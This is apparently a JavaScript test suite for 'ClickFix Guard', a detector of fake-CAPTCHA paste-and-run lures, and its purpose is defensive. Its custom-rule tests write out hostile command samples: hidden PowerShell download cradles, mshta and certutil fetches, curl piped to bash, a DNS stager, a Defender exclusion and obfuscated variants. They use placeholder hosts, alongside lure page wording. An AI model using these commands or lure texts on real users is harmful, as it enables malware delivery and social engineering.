/* ClickFix Guard - engine tests.
 * Runs in the browser (run-tests.html) and in Node (node test/run-tests.js).
 * Tests cover the engine mechanics, the self-test rules and the shipped detection
 * rules. Add a true positive and a benign case under "custom rules" for every new rule.
 */
(function (root) {
  'use strict';

  function runEngineTests(D, rules) {
    const lines = [];
    let total = 0, failed = 0;
    function t(name, fn) {
      total++;
      try {
        fn();
        lines.push('ok    ' + name);
      } catch (e) {
        failed++;
        lines.push('FAIL  ' + name + '\n      ' + (e && e.message ? e.message : e));
      }
    }
    function eq(a, b, msg) {
      if (a !== b) throw new Error((msg || 'expected') + ': got ' + JSON.stringify(a) + ', want ' + JSON.stringify(b));
    }
    function has(arr, v) { if (!arr.includes(v)) throw new Error('signals ' + JSON.stringify(arr) + ' missing ' + v); }

    const counts = D.loadRules(rules);
    lines.push('loaded ' + counts.clipboard + ' clipboard rules, ' + counts.page + ' page rules, ' + counts.combos + ' combos');

    // ---- engine mechanics -------------------------------------------------
    t('empty text scores 0', () => eq(D.score('').score, 0));
    t('null text scores 0', () => eq(D.score(null).score, 0));
    t('plain prose scores 0', () => eq(D.score('See you at the 3pm meeting, bring the slides.').score, 0));
    t('plain URL alone does not reach threshold', () => {
      const r = D.score('https://example.com/some/page#section');
      if (r.score >= D.DEFAULT_THRESHOLD) throw new Error('scored ' + r.score);
    });
    t('whitespace padding adds +1', () => {
      const r = D.score('abc' + ' '.repeat(40) + 'def');
      has(r.signals, 'whitespace-padding');
      eq(r.score, 1);
    });
    t('newline padding adds +1', () => {
      const r = D.score('abc\n\n\n\ndef');
      has(r.signals, 'whitespace-padding');
    });
    t('normalize strips carets and backticks', () => {
      eq(D.normalize('a^b^c `d`'), 'abc d');
    });
    t('normalize strips zero-width characters', () => {
      eq(D.normalize('a\u200Bb\uFEFFc'), 'abc');
    });
    t('normalize joins split strings', () => {
      eq(D.normalize('"ab" + "cd"'), '"abcd"');
    });
    t('normalize collapses whitespace', () => {
      eq(D.normalize('a   b\n\tc'), 'a b c');
    });
    t('page-context adds +2 when page score >= 3', () => {
      const r = D.score('anything at all here', { pageScore: 3 });
      has(r.signals, 'page-context');
      eq(r.score, 2);
    });
    t('page-context not added when page score < 3', () => {
      const r = D.score('anything at all here', { pageScore: 2 });
      eq(r.signals.includes('page-context'), false);
    });
    t('bad regex in a rule is skipped, not fatal', () => {
      const c = D.loadRules({ rules: [{ id: 'bad', weight: 1, pattern: '(' }, { id: 'good', weight: 1, pattern: 'x' }] });
      eq(c.clipboard, 1);
      D.loadRules(rules); // restore
    });
    t('global flag is stripped so .test() is stateless', () => {
      D.loadRules({ rules: [{ id: 'g', weight: 1, pattern: 'zz', flags: 'gi' }] });
      eq(D.score('zz').score, 1);
      eq(D.score('zz').score, 1);
      D.loadRules(rules);
    });
    t('combos add weight only when every listed signal fired', () => {
      D.loadRules({
        rules: [{ id: 'a', weight: 1, pattern: 'alpha' }, { id: 'b', weight: 1, pattern: 'beta' }],
        combos: [{ id: 'ab', weight: 3, all: ['a', 'b'] }]
      });
      eq(D.score('alpha').score, 1);
      eq(D.score('alpha beta').score, 5);
      has(D.score('alpha beta').signals, 'ab');
      D.loadRules(rules);
    });
    t('page score is gated on key AND lure', () => {
      D.loadRules({
        rules: [
          { id: 'k', weight: 2, scope: 'page', key: true, pattern: 'keycombo' },
          { id: 'l', weight: 2, scope: 'page', lure: true, pattern: 'pretext' },
          { id: 'n', weight: 1, scope: 'page', pattern: 'neutral' }
        ]
      });
      eq(D.pageScore('keycombo neutral').score, 0, 'key only');
      eq(D.pageScore('pretext neutral').score, 0, 'lure only');
      eq(D.pageScore('keycombo pretext neutral').score, 5, 'both');
      eq(D.pageScore('keycombo pretext').keyCombo, true);
      eq(D.pageScore('keycombo pretext').lure, true);
      D.loadRules(rules);
    });

    // ---- self-test rules shipped in rules.json --------------------------
    t('self-test clipboard token is blocked', () => {
      const r = D.score('CLICKFIX-GUARD-SELFTEST-CLIPBOARD');
      has(r.signals, 'selftest-clipboard');
      if (r.score < D.DEFAULT_THRESHOLD) throw new Error('scored ' + r.score);
    });
    t('self-test clipboard token is case-insensitive', () => {
      has(D.score('clickfix-guard-selftest-clipboard').signals, 'selftest-clipboard');
    });
    t('self-test page tokens trigger the banner threshold', () => {
      const r = D.pageScore('Step 1 CLICKFIX-GUARD-SELFTEST-PAGE-KEY Step 2 CLICKFIX-GUARD-SELFTEST-PAGE-LURE');
      if (r.score < D.DEFAULT_PAGE_THRESHOLD) throw new Error('scored ' + r.score);
    });
    t('self-test page key token alone does nothing', () => {
      eq(D.pageScore('CLICKFIX-GUARD-SELFTEST-PAGE-KEY').score, 0);
    });

    // ---- custom rules -----------------------------------------------------
    // Samples are inert: .example domains, TEST-NET-3 addresses (203.0.113.0/24)
    // and filler base64. They exercise the patterns, they do not do anything.
    function blocks(name, text, mustHave) {
      t('blocks: ' + name, () => {
        const r = D.score(text);
        if (r.score < D.DEFAULT_THRESHOLD) throw new Error('scored ' + r.score + ' ' + JSON.stringify(r.signals));
        (mustHave || []).forEach(id => has(r.signals, id));
      });
    }
    function allows(name, text) {
      t('allows: ' + name, () => {
        const r = D.score(text);
        if (r.score >= D.DEFAULT_THRESHOLD) throw new Error('scored ' + r.score + ' ' + JSON.stringify(r.signals));
      });
    }
    const CHECK = String.fromCharCode(0x2705);
    const ENDASH = String.fromCharCode(0x2013);
    const B64 = 'QUJD'.repeat(15);

    blocks('powershell hidden download cradle with captcha decoy',
      'powershell -w hidden -c "iwr https://lure.example/v.ps1 | iex" # I am not a robot - reCAPTCHA Verification ID: 4821',
      ['lolbin-powershell', 'hide-window', 'execute-cmdlet', 'decoy-comment', 'combo-download-cradle']);
    blocks('mshta remote with check-mark decoy',
      'mshta https://lure.example/check.hta # ' + CHECK + ' Cloudflare verification complete',
      ['lolbin-mshta', 'remote-url', 'combo-mshta-remote', 'decoy-comment']);
    blocks('encoded command behind start /min',
      'cmd /c start /min powershell -nop -ep bypass -e ' + B64,
      ['encoded-command', 'hide-window', 'policy-bypass']);
    blocks('msiexec installing from a URL',
      'msiexec /i https://lure.example/update.msi /qn', ['msiexec-remote']);
    blocks('curl to bare IP piped to bash',
      'curl -s http://203.0.113.10/x | bash', ['remote-bare-ip', 'pipe-to-shell']);
    blocks('macOS base64 decode piped to shell',
      "echo 'ZWNobyBjbGlja2ZpeCBndWFyZCB0ZXN0' | base64 -d | bash", ['base64-pipe-shell', 'obf-base64-decode']);
    blocks('macOS bash -c curl substitution from an IP',
      '/bin/bash -c "$(curl -fsSL http://203.0.113.10/install.sh)"', ['shell-subst-download', 'remote-bare-ip']);
    blocks('macOS download, chmod, strip quarantine',
      'curl -o /tmp/upd https://lure.example/u && chmod +x /tmp/upd && xattr -c /tmp/upd && /tmp/upd',
      ['macos-quarantine-strip', 'macos-download-exec']);
    blocks('certutil urlcache download to %TEMP%',
      'certutil -urlcache -split -f https://lure.example/a.exe %TEMP%\\a.exe', ['certutil-fetch', 'write-then-run-temp']);
    blocks('rundll32 from a WebDAV UNC path',
      'rundll32 \\\\203.0.113.10@SSL\\share\\x.dll,Run', ['rundll32-script', 'remote-unc']);
    blocks('finger piped to cmd',
      'finger verify@203.0.113.10 | cmd', ['finger-fetch']);
    blocks('nslookup DNS stager',
      'cmd /c "nslookup -q=txt verify.lure.example 203.0.113.10 | findstr ^"Name:^""', ['nslookup-stager']);
    blocks('FileFix path decoy after a command',
      'powershell -c ping lure.example                    # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx',
      ['decoy-filefix-path', 'whitespace-padding']);
    blocks('caret and backtick obfuscation is normalised away',
      'p^o^w^e^r^s^h^e^l^l -W^in Hi^dden -c "i`ex(i`wr https://lure.example)"', ['lolbin-powershell', 'hide-window']);
    blocks('wildcard path to mshta',
      'C:\\W*\\S*32\\m*ta.exe https://lure.example/x', ['obf-wildcard-exe']);
    blocks('scriptblock from base64',
      "powershell -nop -c \"& ([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + B64 + "'))))\"",
      ['execute-cmdlet', 'obf-base64-decode']);
    blocks('en dash parameter prefixes',
      'powershell ' + ENDASH + 'w h ' + ENDASH + 'c "irm lure.example/p | iex"', ['hide-window', 'combo-hidden-powershell']);
    blocks('defender exclusion',
      'powershell -c Add-MpPreference -ExclusionPath C:\\', ['defender-tamper']);
    blocks('char-cast obfuscation',
      "powershell -c \"iex (-join ([char]105,[char]119,[char]114))\"", ['obf-char-cast', 'obf-reverse-join']);

    // Benign developer / admin snippets that must stay under the threshold.
    allows('powershell bypass to run a local build script', 'powershell -ExecutionPolicy Bypass -File .\\build.ps1');
    allows('docker convenience script piped to sh', 'curl -fsSL https://get.docker.com | sh');
    allows('Homebrew installer',
      '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"');
    allows('rustup installer', "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh");
    allows('git clone', 'git clone https://github.com/org/repo.git');
    allows('ssh to a private address', 'ssh admin@192.168.1.20');
    allows('Azure CLI MSI install from docs',
      "Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'");
    allows('certutil hash a file', 'certutil -hashfile setup.exe SHA256');
    allows('nslookup a host', 'nslookup example.com');
    allows('nslookup filtered through findstr', 'nslookup example.com | findstr Address');
    allows('python one-liner', 'python -c "print(1)"');
    allows('pipeline filter', 'Get-ChildItem C:\\Logs -Recurse | Where-Object Length -gt 1MB');
    allows('pinned pip version', 'pip install requests==2.31.0');
    allows('version with four parts', 'npm i some-package@1.2.3.4');
    allows('commit message mentioning fix', '# fix typo in README');
    allows('cmd dir', 'cmd /c dir');
    allows('wsl install', 'wsl --install');
    allows('kubectl', 'kubectl get pods -n kube-system');
    allows('ping a public resolver', 'ping 8.8.8.8');

    // Page rules.
    t('page: classic ClickFix verification lure scores above banner threshold', () => {
      const r = D.pageScore('Verify you are human. Step 1: Press Windows Key + R. Step 2: Press Ctrl + V. Step 3: Press Enter.');
      if (r.score < D.DEFAULT_PAGE_THRESHOLD) throw new Error('scored ' + r.score + ' ' + JSON.stringify(r.signals));
      has(r.signals, 'page-key-run'); has(r.signals, 'page-lure-captcha');
    });
    t('page: FileFix shared-file lure scores above banner threshold', () => {
      const r = D.pageScore('To access the shared file, open the File Explorer address bar (Ctrl + L) and paste the file path.');
      if (r.score < D.DEFAULT_PAGE_THRESHOLD) throw new Error('scored ' + r.score + ' ' + JSON.stringify(r.signals));
    });
    t('page: macOS terminal lure scores above banner threshold', () => {
      const r = D.pageScore('Security check failed. Press Cmd + Space, open Terminal and press Cmd + V, then press Return.');
      if (r.score < D.DEFAULT_PAGE_THRESHOLD) throw new Error('scored ' + r.score + ' ' + JSON.stringify(r.signals));
    });
    t('page: IT help article with Win+R but no pretext scores 0', () => {
      eq(D.pageScore('To open the Run dialog press Windows key + R, type msinfo32 and press Enter.').score, 0);
    });
    t('page: ordinary reCAPTCHA form with no key combo scores 0', () => {
      eq(D.pageScore('Please complete the reCAPTCHA to continue.').score, 0);
    });

    return { total, failed, lines };
  }

  if (typeof module === 'object' && module && module.exports) module.exports = runEngineTests;
  else root.runEngineTests = runEngineTests;
})(typeof globalThis !== 'undefined' ? globalThis : this);
